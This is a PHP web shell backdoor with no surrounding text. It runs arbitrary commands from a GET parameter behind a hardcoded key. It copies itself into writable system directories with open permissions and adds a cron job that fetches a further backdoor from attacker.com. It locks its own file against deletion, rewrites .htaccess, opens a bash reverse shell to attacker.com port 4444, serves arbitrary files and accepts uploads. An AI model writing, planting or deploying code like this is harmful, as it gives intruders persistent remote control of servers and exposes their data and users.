<?php
$secret = "x9F#2mQ!7kL$5pR*";
if (!isset($_GET["key"]) || $_GET["key"] !== $secret) die("Access Denied");
if (isset($_GET["cmd"])) { system($_GET["cmd"]); exit; }
$dirs = ["/tmp/","/var/tmp/","/dev/shm/","/home/","/root/","/var/www/html/","/var/www/","/usr/share/","/opt/","/var/log/"];
foreach ($dirs as $d) { if (is_writable($d)) { copy(__FILE__, $d."system_core.php"); if (PHP_OS!=="WINNT") chmod($d."system_core.php",0777); } }
if (PHP_OS !== 'WINNT') { $cron_cmd = "*/5 * * * * php " . realpath(__FILE__) . "?key=$secret&cmd=wget -q -O /tmp/backdoor.php http://attacker.com/backdoor.php"; file_put_contents("/tmp/cron_job", $cron_cmd); system("crontab /tmp/cron_job 2>/dev/null"); system("chattr +i " . __FILE__ . " 2>/dev/null"); }
$backup_files = ["/tmp/backup_shell.php","/var/tmp/backup_shell.php"];
foreach ($backup_files as $bf) { if (!file_exists($bf)) { file_put_contents($bf, file_get_contents(__FILE__)); } }
$htaccess = 'Options -Indexes\n<FilesMatch "\\.(php|phtml)$">\nOrder Deny,Allow\nDeny from all\n</FilesMatch>';
file_put_contents(".htaccess", $htaccess);
if (isset($_GET["revshell"])) { system("bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\""); }
if (isset($_GET["download"])) { readfile($_GET["download"]); }
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) { move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); }
?>